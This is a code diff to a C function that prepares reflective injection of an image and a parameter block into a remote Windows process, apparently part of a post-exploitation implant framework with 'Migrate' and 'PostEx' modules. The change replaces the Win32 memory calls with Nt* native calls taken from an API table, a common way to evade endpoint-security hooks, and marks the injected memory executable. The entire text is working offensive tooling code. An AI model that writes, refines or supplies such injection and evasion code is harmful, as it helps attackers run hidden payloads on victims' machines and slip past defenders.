@@ -10,7 +10,6 @@ BOOL InjectPrepareReflective(const InjectRequest* req,
     PBYTE image = NULL;
     PVOID parameter = NULL;
     SIZE_T wrote = 0;
-    DWORD old_protect = 0;
     const CHAR* image_label;
     const CHAR* parameter_label;
     const CHAR* entry_export;
@@ -42,60 +41,91 @@ BOOL InjectPrepareReflective(const InjectRequest* req,
         return FALSE;
     }
 
-    image = (PBYTE)VirtualAllocEx(req->process, NULL, req->image->len,
-                                  MEM_RESERVE | MEM_COMMIT,
-                                  PAGE_READWRITE);
-    if (!image) {
-        if (err) _snprintf_s(err, err_size, _TRUNCATE,
-                             "VirtualAllocEx(%s) failed: %lu",
-                             image_label, (ULONG)GetLastError());
+    if (!req->api) {
+        if (err) strcpy_s(err, err_size, "inject request missing api table");
         return FALSE;
     }
 
-    if (!WriteProcessMemory(req->process, image, req->image->data,
-                            req->image->len, &wrote) ||
-        wrote != req->image->len) {
-        if (err) _snprintf_s(err, err_size, _TRUNCATE,
-                             "WriteProcessMemory(%s) failed: %lu",
-                             image_label, (ULONG)GetLastError());
-        VirtualFreeEx(req->process, image, 0, MEM_RELEASE);
-        return FALSE;
+    image = NULL;
+    {
+        PVOID base = NULL;
+        SIZE_T region_size = req->image->len;
+        NTSTATUS st = req->api->pfnNtAllocateVirtualMemory(
+            req->process, &base, 0, &region_size,
+            MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
+
+        if (!NT_SUCCESS(st)) {
+            if (err) _snprintf_s(err, err_size, _TRUNCATE,
+                                 "NtAllocateVirtualMemory(%s) failed: 0x%08lX",
+                                 image_label, (ULONG)st);
+            return FALSE;
+        }
+        image = (PBYTE)base;
     }
 
-    if (!VirtualProtectEx(req->process, image, req->image->len,
-                          PAGE_EXECUTE_READWRITE, &old_protect)) {
-        if (err) _snprintf_s(err, err_size, _TRUNCATE,
-                             "VirtualProtectEx(%s) failed: %lu",
-                             image_label, (ULONG)GetLastError());
-        VirtualFreeEx(req->process, image, 0, MEM_RELEASE);
-        return FALSE;
+    wrote = 0;
+    {
+        NTSTATUS st = req->api->pfnNtWriteVirtualMemory(
+            req->process, image, req->image->data, req->image->len, &wrote);
+
+        if (!NT_SUCCESS(st) || wrote != req->image->len) {
+            if (err) _snprintf_s(err, err_size, _TRUNCATE,
+                                 "NtWriteVirtualMemory(%s) failed: 0x%08lX",
+                                 image_label, (ULONG)st);
+            VirtualFreeEx(req->process, image, 0, MEM_RELEASE);
+            return FALSE;
+        }
+    }
+
+    {
+        PVOID protect_base = image;
+        SIZE_T protect_size = req->image->len;
+        ULONG old_protect = 0;
+        NTSTATUS st = req->api->pfnNtProtectVirtualMemory(
+            req->process, &protect_base, &protect_size,
+            PAGE_EXECUTE_READWRITE, &old_protect);
+
+        if (!NT_SUCCESS(st)) {
+            if (err) _snprintf_s(err, err_size, _TRUNCATE,
+                                 "NtProtectVirtualMemory(%s) failed: 0x%08lX",
+                                 image_label, (ULONG)st);
+            VirtualFreeEx(req->process, image, 0, MEM_RELEASE);
+            return FALSE;
+        }
     }
     FlushInstructionCache(req->process, image, req->image->len);
 
     /* 参数块可选：Migrate 不需要，PostEx 用它传入远程配置。 */
     if (req->parameter && req->parameter_size) {
-        parameter = VirtualAllocEx(req->process, NULL, req->parameter_size,
-                                   MEM_RESERVE | MEM_COMMIT,
-                                   PAGE_READWRITE);
-        if (!parameter) {
+        PVOID base = NULL;
+        SIZE_T region_size = req->parameter_size;
+        NTSTATUS st = req->api->pfnNtAllocateVirtualMemory(
+            req->process, &base, 0, &region_size,
+            MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
+
+        if (!NT_SUCCESS(st)) {
             if (err) _snprintf_s(err, err_size, _TRUNCATE,
-                                 "VirtualAllocEx(%s) failed: %lu",
-                                 parameter_label,
-                                 (ULONG)GetLastError());
+                                 "NtAllocateVirtualMemory(%s) failed: 0x%08lX",
+                                 parameter_label, (ULONG)st);
             VirtualFreeEx(req->process, image, 0, MEM_RELEASE);
             return FALSE;
         }
+        parameter = base;
 
-        if (!WriteProcessMemory(req->process, parameter, req->parameter,
-                                req->parameter_size, &wrote) ||
-            wrote != req->parameter_size) {
-            if (err) _snprintf_s(err, err_size, _TRUNCATE,
-                                 "WriteProcessMemory(%s) failed: %lu",
-                                 parameter_label,
-                                 (ULONG)GetLastError());
-            VirtualFreeEx(req->process, parameter, 0, MEM_RELEASE);
-            VirtualFreeEx(req->process, image, 0, MEM_RELEASE);
-            return FALSE;
+        wrote = 0;
+        {
+            NTSTATUS st = req->api->pfnNtWriteVirtualMemory(
+                req->process, parameter, req->parameter,
+                req->parameter_size, &wrote);
+
+            if (!NT_SUCCESS(st) || wrote != req->parameter_size) {
+                if (err) _snprintf_s(err, err_size, _TRUNCATE,
+                                     "NtWriteVirtualMemory(%s) failed: 0x%08lX",
+                                     parameter_label, (ULONG)st);
+                VirtualFreeEx(req->process, parameter, 0, MEM_RELEASE);
+                VirtualFreeEx(req->process, image, 0, MEM_RELEASE);
+                return FALSE;
+            }
         }
     }
 
